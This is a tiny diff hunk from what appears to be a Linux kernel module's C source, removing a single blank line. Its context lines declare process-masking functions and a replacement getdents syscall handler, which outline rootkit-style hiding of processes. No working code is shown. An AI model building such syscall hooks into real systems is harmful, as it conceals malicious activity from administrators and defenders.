@@ -61,7 +61,6 @@ static int pids_count;   //TODO: to be deleted
 static int process_masking_init(int);
 static int process_masking_exit(void);
 
-
 asmlinkage int my_getdents_syscall(unsigned int, struct linux_dirent *, unsigned int);
 
 static void mask_process(pid_t);
